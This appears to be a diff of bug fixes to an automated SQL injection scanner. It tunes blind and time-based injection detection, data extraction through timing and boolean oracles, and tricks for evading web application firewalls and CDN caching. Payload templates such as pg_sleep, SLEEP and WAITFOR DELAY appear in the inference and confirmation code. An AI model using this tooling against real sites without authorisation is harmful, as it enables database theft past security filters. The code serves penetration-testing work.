@@ -35936,7 +35936,12 @@ class KeywordIsolationEngine:
             return self.trigger_keyword
         
         blocked_status = blocked_fp.status_code if blocked_fp else 403
-        
+        # Rate-limit: 429 means the server is throttling, not that a WAF keyword fired.
+        # Keyword-stripped probes will also return 429 → isolation always fails.
+        # Return None to signal "isolation not applicable" (caller should skip Check A adaptation).
+        if blocked_status == 429:
+            return None
+
         # Extract SQL keywords from the payload
         _keywords = self._extract_keywords(payload)
         if not _keywords:
@@ -54067,7 +54072,17 @@ class Scanner:
                     _template = _body + " AND [INFERENCE]"
                     LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
 
-        #  Step 2: DBMS-specific SUBSTRING/ASCII functions 
+        # FIX: Strip WAF-blocked '>0' suffix from generate_series/count(*) subqueries.
+        # HQ detection payloads end with '))>0' — the WAF blocks the '>' operator at the
+        # outer level, causing all extraction probes to return WAF blocks regardless of the
+        # condition inside CASE WHEN. 'count(*) IS NOT NULL' is always TRUE and avoids '>'.
+        # This must run on _template (after [INFERENCE] substitution) so it covers all paths.
+        if _template and 'generate_series' in _template.lower():
+            _template = _re.sub(r'\)\)\s*>\s*0\b', ')) IS NOT NULL', _template)
+            if _re.search(r'IS NOT NULL', _template):
+                LOG.info("[Inference] Template: stripped '>0' → 'IS NOT NULL' for generate_series HQ payload")
+
+        #  Step 2: DBMS-specific SUBSTRING/ASCII functions
         # When 'between' was in the detection tamper chain, the WAF likely
         # blocks '>'. Use BETWEEN syntax natively for extraction comparisons
         # so the WAF allows them through.
@@ -55010,7 +55025,10 @@ class Scanner:
                          "x-fd-int-roxy-purgeid","x-edge-ip","x-edge-location",
                          "report-to","nel","permissions-policy","timing-allow-origin",
                          "x-nf-request-id","x-vercel-id","fly-request-id",
-                         "content-length","content-type","server","connection",
+                         # FIX-HDR-SKIP-CONTENT-LENGTH: content-length removed from skip set.
+                         # A difference in content-length between true/false condition responses
+                         # IS a valid boolean detection signal (body size changed by SQL injection).
+                         "content-type","server","connection",
                          "cache-control","strict-transport-security","transfer-encoding",
                          "vary","pragma","accept-ranges","alt-svc","via"}
             _ht = {k.lower(): v for k, v in (getattr(fp_true, "headers", {}) or {}).items()}
@@ -58230,10 +58248,17 @@ class Scanner:
                     elif _length is None:
                         LOG.warning("[Inference] %s: bitwise length returned None — aborting", label)
                         return ""
-                    else:
-                        # _length == 0: bitwise says truly empty
+                    elif _length == 0:
+                        # FIX-BUG8: _length==0 is truly empty; _length==-1 is
+                        # WAF-blocked/unknown.  Was combining both into "bitwise length=0".
                         LOG.info("[Inference] %s: empty (bitwise length=0)", label)
                         return ""
+                    else:
+                        # _length == -1: all bitwise bits returned None/False — WAF blocked
+                        # or oracle dead.  Use max_len as fallback instead of returning "".
+                        LOG.warning("[Inference] %s: bitwise length all-zero (WAF-blocked?) — "
+                                    "falling back to max_len=%d", label, max_len)
+                        _length = max_len
                 except Exception as _bwl_e:
                     LOG.debug("[Inference] %s: bitwise length error: %s — aborting", label, _bwl_e)
                     return ""
@@ -58953,6 +58978,79 @@ class Scanner:
                 LOG.info("[Inference] Extraction data garbage  falling through to side channels")
             else:
                 LOG.info("[Inference] No extraction data  falling through to side channels")
+
+        # FIX-BUG4-FORWARD-REF: _extract_string (called in the retry block below) internally
+        # calls _rebuild_template_if_needed and _get_length_fast. Both were previously defined
+        # AFTER the retry block → NameError at runtime (caught by broad except → silent failure).
+        # Move them here so they are available before the retry block runs.
+        async def _rebuild_template_if_needed():
+            """Check if current template still produces timing signal."""
+            nonlocal _template, _thresh, _boolean_oracle, _delay
+            _, ms_t = await _send_payload("1=1")
+            await asyncio.sleep(_delay)
+            _, ms_f = await _send_payload("1=2")
+            _m = ms_t - ms_f
+            if _m < 30 and not _boolean_oracle:
+                LOG.warning("[Inference] Timing signal lost (margin=%.0fms)  trying arithmetic template", _m)
+                _sleep_m = _re.search(r'(pg_sleep|SLEEP|sleep)\s*\(\s*(\d+)', _body, _re.I)
+                if _sleep_m:
+                    _num = _sleep_m.group(2)
+                    _npos = _sleep_m.start(2)
+                    _pre = _body[:_npos]
+                    _post = _body[_npos + len(_num):]
+                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                        _arith = f"([INFERENCE])::int*{_num}"
+                    elif _dbms in ("MySQL", "MariaDB"):
+                        _arith = f"IF([INFERENCE],{_num},0)"
+                    elif _dbms == "H2":
+                        _arith = f"([INFERENCE])*{_num}"
+                    else:
+                        _arith = f"(CASE WHEN [INFERENCE] THEN {_num} ELSE 0 END)"
+                    _template = _pre + _arith + _post
+                    LOG.info("[Inference] Switched to arithmetic: %s", _template[:70])
+                    _, ms_t = await _send_payload("1=1")
+                    await asyncio.sleep(_delay)
+                    _, ms_f = await _send_payload("1=2")
+                    _m = ms_t - ms_f
+                    if _m > 30:
+                        _thresh = (ms_t + ms_f) / 2
+                        LOG.info("[Inference] Arithmetic works! margin=%.0fms", _m)
+                        return True
+                return False
+            elif _m > 30:
+                _thresh = (ms_t + ms_f) / 2
+            return True
+
+        async def _get_length_fast(query, max_len=256):
+            """Check common lengths first: 3-4 probes instead of 8."""
+            _len_uses_bt = "BETWEEN" in (_len_tpl or "").upper() or ">=" in (_len_tpl or "")
+            _empty = await _eval_confirm(
+                _len_tpl.replace("[QUERY]", query).replace("{mid}", str(1 if _len_uses_bt else 0)))
+            if _empty is False:
+                _empty2 = await _eval(
+                    _len_tpl.replace("[QUERY]", query).replace("{mid}", str(2 if _len_uses_bt else 1)))
+                if _empty2 is not False:
+                    pass
+                else:
+                    return 0
+            for _bp in [8, 20, 50, 100]:
+                if _bp > max_len: break
+                _eff_bp = _bp + 1 if _len_uses_bt else _bp
+                r = await _eval(_len_tpl.replace("[QUERY]", query).replace("{mid}", str(_eff_bp)))
+                if r is False:
+                    _lo = {8:0, 20:8, 50:20, 100:50}[_bp]
+                    lo, hi = _lo, _bp
+                    while lo < hi:
+                        mid = _randomized_mid(lo, hi)
+                        _eff_mid2 = mid + 1 if _len_uses_bt else mid
+                        r2 = await _eval(_len_tpl.replace("[QUERY]", query).replace("{mid}", str(_eff_mid2)))
+                        if r2 is None: return -1
+                        if r2: lo = mid + 1
+                        else: hi = mid
+                        await asyncio.sleep(_delay * 0.5)
+                    return lo
+                await asyncio.sleep(_delay * 0.5)
+            return await _get_length(query, max_len)
 
         # BUG-7-MAIN-EXTRACT-RETRY FIX (CRITICAL): The extraction block at ~57446 ran
         # before _extract_string (defined at ~58043) and _cached_eval (defined at ~57775)
@@ -59743,105 +59841,9 @@ class Scanner:
 
             return _cols
 
-        #  ENHANCEMENT: Multi-technique fallback 
-        # If WHERE-based timing fails mid-extraction (margin drops),
-        # automatically rebuild template with different approach
-        async def _rebuild_template_if_needed():
-            """Check if current template still produces timing signal."""
-            nonlocal _template, _thresh, _boolean_oracle, _delay
-            _, ms_t = await _send_payload("1=1")
-            await asyncio.sleep(_delay)
-            _, ms_f = await _send_payload("1=2")
-            _m = ms_t - ms_f
-            if _m < 30 and not _boolean_oracle:
-                LOG.warning("[Inference] Timing signal lost (margin=%.0fms)  trying arithmetic template", _m)
-                # Try replacing WHERE with arithmetic approach
-                _sleep_m = _re.search(r'(pg_sleep|SLEEP|sleep)\s*\(\s*(\d+)', _body, _re.I)
-                if _sleep_m:
-                    _num = _sleep_m.group(2)
-                    _npos = _sleep_m.start(2)
-                    _pre = _body[:_npos]
-                    _post = _body[_npos + len(_num):]
-                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-                        _arith = f"([INFERENCE])::int*{_num}"
-                    elif _dbms in ("MySQL", "MariaDB"):
-                        _arith = f"IF([INFERENCE],{_num},0)"
-                    elif _dbms == "H2":
-                        _arith = f"([INFERENCE])*{_num}"
-                    else:
-                        _arith = f"(CASE WHEN [INFERENCE] THEN {_num} ELSE 0 END)"
-                    _template = _pre + _arith + _post
-                    LOG.info("[Inference] Switched to arithmetic: %s", _template[:70])
-                    # Recalibrate
-                    _, ms_t = await _send_payload("1=1")
-                    await asyncio.sleep(_delay)
-                    _, ms_f = await _send_payload("1=2")
-                    _m = ms_t - ms_f
-                    if _m > 30:
-                        _thresh = (ms_t + ms_f) / 2
-                        LOG.info("[Inference] Arithmetic works! margin=%.0fms", _m)
-                        return True
-                return False
-            elif _m > 30:
-                # Update threshold
-                _thresh = (ms_t + ms_f) / 2
-            return True
+        # _rebuild_template_if_needed and _get_length_fast moved earlier — see FIX-BUG4-FORWARD-REF
 
-
-        #  ENHANCEMENT: Optimistic length detection 
-        async def _get_length_fast(query, max_len=256):
-            """Check common lengths first: 3-4 probes instead of 8."""
-            # BUG-V137-INFERENCE-CHAR-LEN-STRICT-GT FIX: Also detect ">=" in _len_tpl.
-            # _LENGTH_FN templates changed from >{mid} to >={mid}, so _len_uses_bt must
-            # detect >= just like BETWEEN. Both modes use mid+1 as the effective value
-            # so >= mid+1 ≡ > mid and BETWEEN mid+1 AND N ≡ > mid are semantically identical.
-            _len_uses_bt = "BETWEEN" in (_len_tpl or "").upper() or ">=" in (_len_tpl or "")
-            # BUG FIX: was `await _eval(...)` — single probe, no confirmation.
-            # If CDN noise returns False for LENGTH(db)>0 on a non-empty string,
-            # _extract_string returns "" immediately (database: equality length=0).
-            # Use _eval_confirm (up to 3 probes) so CDN-cached false negatives
-            # are overridden by the majority vote.
-            # For >= mode: str(1) → LENGTH >= 1 (True for any non-empty string) ✓
-            # For BETWEEN mode: str(1) → BETWEEN 1 AND 99999 (True for length >= 1) ✓
-            _empty = await _eval_confirm(
-                _len_tpl.replace("[QUERY]", query).replace("{mid}", str(1 if _len_uses_bt else 0)))
-            if _empty is False:
-                # BUG-V62-EMPTY-CHECK-CDN FIX: The empty check condition is ALWAYS TRUE
-                # (LENGTH >= 0 for any string, including empty). If _eval_confirm returns
-                # False, it's almost certainly a CDN false negative (all 3 probes returned
-                # CDN-cached fast response, or the fast-path classified probe 1 as False
-                # due to CDN speed). Retry with a DIFFERENT condition to confirm:
-                # use {mid}=2 (or 1 for > mode) which is still always True for non-empty
-                # strings and has a different CDN cache key.
-                _empty2 = await _eval(
-                    _len_tpl.replace("[QUERY]", query).replace("{mid}", str(2 if _len_uses_bt else 1)))
-                if _empty2 is not False:
-                    pass  # retry confirmed non-empty — proceed to breakpoints
-                else:
-                    return 0  # genuinely empty (both probes agree)
-            for _bp in [8, 20, 50, 100]:
-                if _bp > max_len: break
-                # For >= mode: _eff_bp = _bp+1 so condition is LENGTH >= _bp+1 (≡ > _bp) ✓
-                _eff_bp = _bp + 1 if _len_uses_bt else _bp
-                r = await _eval(_len_tpl.replace("[QUERY]", query).replace("{mid}", str(_eff_bp)))
-                if r is False:
-                    _lo = {8:0, 20:8, 50:20, 100:50}[_bp]
-                    lo, hi = _lo, _bp
-                    while lo < hi:
-                        # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
-                        # Fixed pivot in _get_length_fast inner refinement bisect.
-                        mid = _randomized_mid(lo, hi)
-                        _eff_mid2 = mid + 1 if _len_uses_bt else mid
-                        r2 = await _eval(_len_tpl.replace("[QUERY]", query).replace("{mid}", str(_eff_mid2)))
-                        if r2 is None: return -1
-                        if r2: lo = mid + 1
-                        else: hi = mid
-                        await asyncio.sleep(_delay * 0.5)
-                    return lo
-                await asyncio.sleep(_delay * 0.5)
-            return await _get_length(query, max_len)
-
-        #  ENHANCEMENT: Body hash oracle 
+        #  ENHANCEMENT: Body hash oracle
         # BUG-C FIX: The original lines `_body_hash_true = None` and
         # `_body_hash_false = None` executed UNCONDITIONALLY, overwriting values
         # that may have been set at lines ~30626-30627 during the calibration block
@@ -97988,7 +97990,7 @@ class WAFBlockDiscriminator:
         genuinely cannot read injection signal from a rate-limit page.
         """
         if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) == 429:
-            return True  # rate-limit: no useful signal, back off
+            return False  # rate-limit is NOT a WAF block — different root cause, different handler
         if not fp.body:
             return False
         body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
@@ -105895,7 +105897,13 @@ class TechniqueCascadeEngine:
 
         async def _pcv_send(p):
             try:
-                _pcv_url, _pcv_data, _pcv_extra = url, data, {}
+                # FIX: per-probe cache-bust nonce so CDN serves a fresh response
+                # for every PCV canary probe instead of returning a cached copy.
+                _pcv_nonce = random.randint(1_000_000, 9_999_999)
+                _pcv_cbh = hashlib.md5(str(p).encode('utf-8', errors='replace')).hexdigest()[:10]
+                _pcv_cb_suffix = _get_cache_bust_params(_pcv_nonce, _pcv_cbh)
+                _pcv_url = url + ("&" if "?" in url else "?") + _pcv_cb_suffix
+                _pcv_data, _pcv_extra = data, {}
                 # Apply padding if active
                 _pcv_pad = getattr(self, '_padding_engine', None)
                 if _pcv_pad and _pcv_pad.effective_size:
@@ -106971,10 +106979,12 @@ class TechniqueCascadeEngine:
         )
 
         _a_label = "STRONG PASS" if _a_strong else ("PASS" if _a_pass else "FAIL")
+        # FIX-BUG2-CHECK-A-LOG: Old code always printed "(3 fallbacks tried)" even when
+        # zero fallbacks were attempted.  Now prints which method was tried on FAIL.
         print(f"[*]     Check A (body canary): {_a_label}"
-              f"{'  via ' + _a_method + ' gap=' + f'{_a_gap:.3f}' if _a_pass else ' (3 fallbacks tried)'}", flush=True)
+              f"{'  via ' + _a_method + ' gap=' + f'{_a_gap:.3f}' if _a_pass else ' (' + _a_method + ')'}", flush=True)
         print("[*]     Check C (error fingerprint): "
-              f"{'PASS via ' + _c_method + '  ' + _c_match + _c_note if _c_pass else 'FAIL (3 fallbacks tried, baseline-subtracted)'}", flush=True)
+              f"{'PASS via ' + _c_method + '  ' + _c_match + _c_note if _c_pass else 'FAIL (' + _c_note + ')'}", flush=True)
 
         _details["A"] = f"{_a_method}: gap={_a_gap:.3f}" if _a_pass else "failed"
         _details["C"] = f"{_c_method}: {_c_match}{_c_note}" if _c_pass else "failed"
@@ -112340,7 +112350,9 @@ class TechniqueCascadeEngine:
                 pass
             if not hasattr(self, '_dbms_block_run'):
                 self._dbms_block_run = {}
-            self._dbms_block_run[dbms] = self._dbms_block_run.get(dbms, 0) + 1
+            # Guard: 429 is a rate-limit, not a WAF block — do not count it toward TECHNIQUE-22 rotation
+            if _get_safe_status_code(fp) != 429:
+                self._dbms_block_run[dbms] = self._dbms_block_run.get(dbms, 0) + 1
 
         if tech == "E":
             # BUG-EH-DEAD-HANDLER FIX: EH was previously caught by `if tech in ("E", "EH"):`.
@@ -113695,9 +113707,11 @@ class TechniqueCascadeEngine:
                     # however CDN-cached injection responses can arrive at up to 350ms.
                     # Old 1.10 threshold (220ms) rejected genuine CDN-cached responses at 351ms.
                     # New 1.75 threshold (350ms) correctly captures CDN-warm range up to 350ms.
-                    if _fp1_gap > time_threshold * 0.80 and fp2.elapsed_ms < _bl_ms2 * 1.75:
+                    if _fp1_gap > time_threshold * 0.80 and fp2.elapsed_ms <= _bl_ms2 * 1.80:
+                        # FIX: raised from 1.75 to 1.80 (360ms for baseline=200ms), strict < → <=
+                        # Observed CDN-warm fp2=351ms was excluded by old 1.75 cutoff (350ms strict <)
                         print(f"    [T-confirm] CDN-single: fp1_gap={_fp1_gap:.0f}ms (>{time_threshold*0.80:.0f}ms), "
-                              f"fp2={fp2.elapsed_ms:.0f}ms CDN-warm (<{_bl_ms2*1.10:.0f}ms)  CDN-cached injection", flush=True)
+                              f"fp2={fp2.elapsed_ms:.0f}ms CDN-warm (<={_bl_ms2*1.80:.0f}ms)  CDN-cached injection", flush=True)
                         _conf_abs = True
                         self._last_confirm_failed = False
                 #  BUG-10 FIX: TemporalAnomalyDetector secondary confirmation 
@@ -114649,8 +114663,8 @@ class TechniqueCascadeEngine:
                                             self.tamper_chain,
                                             bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                 self._total_reqs += 1
-                _hq_conf = fp2.elapsed_ms >= time_threshold * 0.75 if fp2 else False
-                print(f"    [HQ-confirm] fp2={fp2.elapsed_ms:.0f}ms pass={_hq_conf}" if fp2 else "    [HQ-confirm] network error")
+                _hq_conf = fp2.elapsed_ms >= _hq_thresh * 0.75 if fp2 else False  # FIX: use floored _hq_thresh (not raw time_threshold)
+                print(f"    [HQ-confirm] fp2={fp2.elapsed_ms:.0f}ms pass={_hq_conf} (need>={_hq_thresh*0.75:.0f}ms)" if fp2 else "    [HQ-confirm] network error")
                 if _hq_conf:
                     # Clean probe: verify delay is from heavy query, not WAF
                     _hq_clean_payload = self._make_false_payload(payload)
@@ -114683,8 +114697,10 @@ class TechniqueCascadeEngine:
                             data_fmt, param, original + payload, self.tamper_chain,
                             bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                         self._total_reqs += 1
-                        # BUG-HQ-THRESH-LOW FIX (multi-probe): Was 0.5× (160ms). Raised to 0.85×.
-                        _hq_mp_ok = (_hq_mp and _hq_mp.elapsed_ms >= time_threshold * 0.85)
+                        # FIX: Use floored _hq_thresh (min 1000ms) instead of raw time_threshold (can be 320ms).
+                        # With time_threshold=320ms: 320*0.85=272ms — CDN-cold (323ms) always passes → false positive.
+                        # With _hq_thresh=1000ms: 1000*0.85=850ms — CDN-cold correctly fails.
+                        _hq_mp_ok = (_hq_mp and _hq_mp.elapsed_ms >= _hq_thresh * 0.85)
                         if _hq_mp_ok:
                             _hq_confirmed += 1
                         _hq_mp_ms = _hq_mp.elapsed_ms if _hq_mp else 0
@@ -115036,6 +115052,8 @@ class TechniqueCascadeEngine:
                             # Multi-probe: 3 more SLEEP probes  need 4/5 total
                             _th_confirmed = 2  # original + fp2
                             _th_needed = 4
+                            # FIX: collect elapsed_ms for all probes for frozen-cache CV check
+                            _th_all_ms = [fp.elapsed_ms, (_th_conf.elapsed_ms if _th_conf else fp.elapsed_ms)]
                             for _th_mp_idx in range(3):
                                 # BUG-TH-BODY FIX: Check stop flag before each probe so a
                                 # confirmed injection on another surface immediately halts
@@ -115067,9 +115085,21 @@ class TechniqueCascadeEngine:
                                 _th_mp_ok = (_th_mp and _th_mp.elapsed_ms > _th_mp_thresh)
                                 if _th_mp_ok: _th_confirmed += 1
                                 _th_ms = _th_mp.elapsed_ms if _th_mp else 0
+                                _th_all_ms.append(_th_ms)
                                 print(f"    [TH-multi] SLEEP probe {_th_mp_idx+3}/5: {_th_ms:.0f}ms "
                                       f"{' slow (confirmed)' if _th_mp_ok else ' fast (inconsistent)'} "
                                       f"({_th_confirmed}/{_th_needed})")
+                            # FIX: Frozen-cache guard. When CDN caches TH probe responses
+                            # all 5 probes return identical timing (CV < 0.05). This is a
+                            # CDN caching artifact, not a genuine timing signal. Reject.
+                            if len(_th_all_ms) >= 4:
+                                _th_ms_mean = sum(_th_all_ms) / len(_th_all_ms)
+                                _th_ms_var = sum((x - _th_ms_mean) ** 2 for x in _th_all_ms) / len(_th_all_ms)
+                                _th_ms_std = _th_ms_var ** 0.5
+                                _th_cv = _th_ms_std / _th_ms_mean if _th_ms_mean > 0 else 0.0
+                                if _th_cv < 0.05:
+                                    print(f"    [TH-frozen-cache] CV={_th_cv:.4f} < 0.05  all probes identical timing — CDN cached, not injection")
+                                    return None
                             if _th_confirmed >= _th_needed:
                                 # CANARY: send uninjected request to confirm delay is injection-triggered
                                 _th_canary = await self._safe_confirm(method, url, data, data_fmt,
@@ -115304,6 +115334,19 @@ class TechniqueCascadeEngine:
             # Boolean-time combined: if elapsed_ms significantly exceeds baseline
             # AND we can construct a false-condition counterpart that is fast  confirmed
             _bt_mean = baseline.get("mean_timing", 500)
+            _bt_std = max(baseline.get("std_timing", 50) if isinstance(baseline, dict) else 50, 50)
+            # FIX: Override time_threshold with 0.75 coefficient (same as T handler).
+            # Default _payload_threshold uses 0.50 which is too loose for BT confirmation.
+            _bt_sl = _re.search(
+                r'pg_sleep\s*\(\s*([\d.]+)'
+                r'|(?<!\w)SLEEP\s*\(\s*([\d.]+)'
+                r'|WAITFOR\s+DELAY\s+[\'"]\d+:\d+:([\d.]+)'
+                r'|DBMS_(?:LOCK|PIPE)\.(?:SLEEP|RECEIVE_MESSAGE)\s*\([^,)]*,?\s*([\d.]+)',
+                payload, _re.I)
+            if _bt_sl:
+                _bt_raw = next((g for g in _bt_sl.groups() if g is not None), None)
+                if _bt_raw:
+                    time_threshold = _bt_mean + max(float(_bt_raw) * 1000 * 0.75, _bt_std * 3.0)
             _bt_waf_fast = (_waf_blocked and fp.elapsed_ms < _bt_mean * 1.3)
             _bt_verdict = (" HIT" if fp.elapsed_ms >= time_threshold else
                           " WAF-blocked" if _bt_waf_fast else
@@ -115722,7 +115765,7 @@ class TechniqueCascadeEngine:
                     # technique-appropriate surface so header/JSON injection payloads
                     # don't receive URL-encoded mutations.
                     _bypass_surface = (
-                        'header' if tech in ('EH', 'BH', 'TH', 'UH')
+                        'header' if (tech in ('EH', 'BH', 'TH', 'UH') or data_fmt == 'header')
                         else ('json' if data_fmt in ('json', 'json_body')
                               else ('cookie' if data_fmt in ('cookie', 'cookies')
                                     else 'url'))
@@ -116273,7 +116316,7 @@ class TechniqueCascadeEngine:
                     # (was: getattr(self.config, "_oracle_set_by_instability", False))
                     # — that variable is never True in FULL oracle mode so the old guard
                     # `_high_jitter_page and _strong_gap` never fired.  See fix below.
-                    _strong_gap = delta >= bool_thresh * 2.0
+                    _strong_gap = abs(delta) >= bool_thresh * 2.0  # FIX: use abs() for reversed-polarity
 
                     if _strong_gap:
                         # BUG-MULTIPROBE-HIGHJTTER-WRONG-FLAG FIX: The previous condition
@@ -116325,9 +116368,9 @@ class TechniqueCascadeEngine:
                             _ctx_st = SimHasher.body_similarity(norm_b, ResponseNormaliser.normalise(_extract_body_safe(_ctx_mpt)) if _validate_response(_ctx_mpt, allow_empty=True) else b"")
                             _ctx_sf = SimHasher.body_similarity(norm_b, ResponseNormaliser.normalise(_extract_body_safe(_ctx_mpf)) if _validate_response(_ctx_mpf, allow_empty=True) else b"")
                             _ctx_gap = _ctx_st - _ctx_sf
-                            if _ctx_gap > bool_thresh: _ctx_bconf += 1
+                            if abs(_ctx_gap) > bool_thresh: _ctx_bconf += 1  # FIX: abs() for reversed-polarity
                             print(f"    [CTX-bool] multi-probe {_ctx_mp+2}/6: gap={_ctx_gap:.3f} "
-                                  f"{' CONFIRMED' if _ctx_gap > bool_thresh else ' gap too small'} "
+                                  f"{' CONFIRMED' if abs(_ctx_gap) > bool_thresh else ' gap too small'} "
                                   f"({_ctx_bconf}/3 needed)")
                             if _ctx_bconf >= 3: break
                     if _ctx_bconf >= 3:
@@ -118604,7 +118647,9 @@ class UniversalScanOrchestrator:
                 if not hasattr(_scanner_ref, '_extraction_lock'):
                     _scanner_ref._extraction_lock = asyncio.Lock()
 
-                _ext_key = param
+                # FIX: Include HTTP method in extraction key so GET and POST surface
+                # extractions for the same param don't collide in _extracting_params.
+                _ext_key = f"{param}@{method}"
 
                 # BUG-R5-LOCK FIX: Acquire _extraction_lock around the full check-and-set
                 # block.  asyncio is single-threaded so operations between two 'await'
@@ -118678,7 +118723,7 @@ class UniversalScanOrchestrator:
                     else:
                         # FIRST extraction: atomically claim ownership BEFORE yielding control.
                         _EXTRACTION_STARTED[0] = True
-                        _EXTRACTION_STARTED[1] = f"{param}@{_confirmed_dbms}"
+                        _EXTRACTION_STARTED[1] = f"{param}@{_confirmed_dbms}@{method}"
                         # ADD TO EXTRACTING IMMEDIATELY (before any await)
                         _scanner_ref._extracting_params.add(_ext_key)
                     # Now cancel background scans and stop all probes
@@ -118863,6 +118908,23 @@ class UniversalScanOrchestrator:
                                         LOG.debug(f"[V25-Extract] Oracle calibration failed: {_oracle_err}")
                                         _enum._error_oracle = None
 
+                                    # FIX: Set _boolean_oracle_is_timing regardless of error oracle availability.
+                                    # Without this, when CEO calibration succeeds the V25 timing oracle block
+                                    # (guarded by `if not _enum._error_oracle:`) is skipped, so the flag is
+                                    # never set. _extract_str() then runs boolean sanity (1=1 / 1=2) through
+                                    # the timing oracle: CDN caches both probes → both return False → sanity
+                                    # fails → oracle discarded → "No oracle available" → all extraction empty.
+                                    _v25_det_for_flag = result.detection if hasattr(result, 'detection') else result
+                                    _v25_det_tech_flag = getattr(_v25_det_for_flag, 'technique', '')
+                                    if _v25_det_tech_flag in ('T', 'TH', 'HQ', 'BT'):
+                                        if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
+                                            class _FakeMSETimingFlag:
+                                                _boolean_oracle = None
+                                                _oracles = []
+                                            _enum._mse_instance = _FakeMSETimingFlag()
+                                        _enum._mse_instance._boolean_oracle_is_timing = True
+                                        LOG.info("[V25-Extract] Timing technique %s: _boolean_oracle_is_timing=True (always set)", _v25_det_tech_flag)
+
                                     # FIX-EX-A: When ConditionalErrorOracle calibration failed,
                                     # wire in an inline boolean oracle built directly from the
                                     # confirmed detection result so extraction can still proceed.
@@ -118887,14 +118949,26 @@ class UniversalScanOrchestrator:
                                             # _baseline_raw_b=b"" → sim≈0.5 → oracle always False.
                                             # Capture a live clean probe as reference when needed.
                                             if not _baseline_raw_b:
-                                                try:
-                                                    _iob_ref = await _send_injected(
-                                                        _scanner_ref.engine, method, url, data, data_fmt,
-                                                        _det_param, _det_orig, _det_tamper)
-                                                    if _validate_response(_iob_ref, "response_body_check"):
-                                                        _baseline_raw_b = _iob_ref.body
-                                                except Exception:
-                                                    pass
+                                                # FIX-BUG1-INLINE-ORACLE-BASELINE: retry with
+                                                # _bypass_mutation=True and allow_empty=True so WAF
+                                                # bypass rotation is active and an empty body is
+                                                # accepted as a valid reference (sim(b"",b"")=1.0).
+                                                for _iob_retry in range(3):
+                                                    try:
+                                                        _iob_ref = await asyncio.wait_for(
+                                                            _send_injected(
+                                                                _scanner_ref.engine, method, url, data, data_fmt,
+                                                                _det_param, _det_orig, _det_tamper,
+                                                                _bypass_mutation=True),
+                                                            timeout=15)
+                                                        if _validate_response(_iob_ref, "response_body_check", allow_empty=True):
+                                                            _baseline_raw_b = _iob_ref.body
+                                                            if _baseline_raw_b:
+                                                                break
+                                                    except Exception:
+                                                        pass
+                                                    if _iob_retry < 2:
+                                                        await asyncio.sleep(0.15)
                                             _norm_base_b = ResponseNormaliser.normalise(_baseline_raw_b)
 
                                             # BUG-INLINE-BOOL-ORACLE FIX (Req 7): Old payload
@@ -119254,7 +119328,11 @@ class UniversalScanOrchestrator:
                                                     # minimum threshold since 100MB typically takes 1-4s.
                                                     # For SLEEP-based DBMSes: threshold = baseline + 65% of sleep duration.
                                                     if _db == 'SQLite':
-                                                        _threshold_ms = _bl + 1500  # 100MB RANDOMBLOB: fixed 1.5s minimum
+                                                        # FIX: Scale threshold to actual RANDOMBLOB byte count.
+                                                        # Old 1500ms was calibrated for 100MB bomb (now fixed to ≤4MB).
+                                                        # For ≤4MB: threshold = baseline + max(proportional_ms, 300ms)
+                                                        # 4MB → 1500ms, 1MB → 375ms, ensuring real signal margin.
+                                                        _threshold_ms = _bl + max(int((_iters / 4_000_000) * 1500), 300)
                                                     else:
                                                         _threshold_ms = _bl + (_ts * 1000 * 0.65)  # 65% of sleep
                                                     return _elapsed_ms >= _threshold_ms
@@ -124589,7 +124667,23 @@ class ScannerV14(ScannerV13):
                                             _cookie_values[_cn] = _cv
                         except Exception:
                             pass
-                        
+                        # FIX-COOKIE-REQUEST-SIDE: Also scan cookies provided by the
+                        # user via --cookie CLI option (cfg.cookie).  These are sent
+                        # in every request already but were never enumerated for
+                        # injection testing.  A cookie like "session_id=abc123; token=xyz"
+                        # in cfg.cookie gets each name added to _cookie_names with its
+                        # real value so the oracle gets a realistic baseline request.
+                        _cfg_cookie_str = getattr(cfg, 'cookie', None) or ''
+                        for _cfg_ck_pair in _cfg_cookie_str.split(';'):
+                            _cfg_ck_pair = _cfg_ck_pair.strip()
+                            if '=' in _cfg_ck_pair:
+                                _cfg_cn, _cfg_cv = _cfg_ck_pair.split('=', 1)
+                                _cfg_cn = _cfg_cn.strip()
+                                _cfg_cv = _cfg_cv.strip()
+                                if _cfg_cn and _cfg_cn not in _cookie_names:
+                                    _cookie_names.append(_cfg_cn)
+                                    _cookie_values[_cfg_cn] = _cfg_cv
+
                         async def _scan_one_cookie(_cname):
                             """Test one cookie across GET, POST methods.
                             Uses header injection with param='Cookie' so the
@@ -124794,7 +124888,12 @@ class ScannerV14(ScannerV13):
                         # process in batches of 8 with early-exit between batches.
                         # Combined with the baseline cache, only the first header in each
                         # batch actually builds a baseline  the rest get cache hits.
-                        _HDR_BATCH_SIZE = 2  # 2 headers × 2 methods = 4 concurrent (CPU reduction: was 3→6 tasks)
+                        # FIX: Reduce from 2 to 1. With batch size 2, when header A's cascade triggers
+                        # PCV and sets _SCAN_STOPPED[0]=True, header B's concurrent cascade exits
+                        # halfway through its technique sweep (before T/HQ). After PCV for A rejects
+                        # and _SCAN_STOPPED is restored to False, header B's cascade is already done
+                        # and is never retried — those techniques are silently skipped.
+                        _HDR_BATCH_SIZE = 1  # Sequential header scanning prevents SCAN_STOPPED race
                         _all_hits = []
                         _total_hdrs = len(_hdrs)
                         _batches_done = 0
@@ -124908,6 +125007,11 @@ class ScannerV14(ScannerV13):
                             if _r:
                                 for _cr in _r:
                                     if _cr.detection:
+                                        # FIX: Store actual BGD HTTP method on detection result so
+                                        # extraction merge loop can use the correct method.
+                                        # Without this, all_confirmed gets ep.method (POST) for
+                                        # GET/PUT/PATCH-surface detections → extraction uses wrong method.
+                                        _cr.detection.method = _m
                                         print(f"[+] [{_m}] INJECTION FOUND: {_cr.detection.param} [{_cr.detection.technique}] {_cr.detection.dbms}!", flush=True)
                             # Only report "no injections" if scan completed naturally
                             if _r is not None and not any(cr.detection for cr in (_r or [])):
@@ -125075,17 +125179,23 @@ class ScannerV14(ScannerV13):
                                 result = _det
